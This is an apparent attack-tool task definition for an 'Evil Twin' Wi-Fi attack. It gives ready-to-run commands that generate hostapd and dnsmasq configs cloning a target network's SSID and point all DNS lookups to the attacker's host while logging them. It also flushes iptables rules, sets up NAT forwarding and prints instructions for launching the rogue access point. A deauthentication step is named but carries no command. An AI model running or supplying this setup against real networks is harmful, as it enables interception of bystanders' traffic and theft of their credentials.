name: evil_twin
description: Evil Twin AP attack: create a rogue access point cloning a target SSID with hostapd + dnsmasq to intercept client traffic.
author: james-linux

params.command:
cat > /tmp/james_hostapd.conf << 'CONF'
interface={{interface}}
driver=nl80211
ssid={{target_ssid}}
hw_mode=g
channel={{target_channel}}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
CONF

steps.description: Generate hostapd config cloning target SSID

params.command:
cat > /tmp/james_dnsmasq.conf << 'CONF'
interface={{interface}}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=10.0.0.1
address=/#/10.0.0.1
CONF

steps.description: Generate dnsmasq config for DHCP and DNS on rogue AP

params.command: echo 1 > /proc/sys/net/ipv4/ip_forward && iptables --flush && iptables --table nat --flush && iptables -t nat -A POSTROUTING -o {{internet_interface}} -j MASQUERADE && iptables -A FORWARD -i {{interface}} -o {{internet_interface}} -j ACCEPT

steps.description: Enable IP forwarding and NAT routing through internet interface
Mass deauth clients from real AP to force reconnection to evil twin

params.command: echo '[!] To start the Evil Twin, run these in separate terminals:' && echo '  sudo hostapd /tmp/james_hostapd.conf' && echo '  sudo dnsmasq -C /tmp/james_dnsmasq.conf -d' && echo '' && echo 'Config files are ready at /tmp/james_hostapd.conf and /tmp/james_dnsmasq.conf'

steps.description: Display instructions to launch rogue AP (requires interactive terminals)
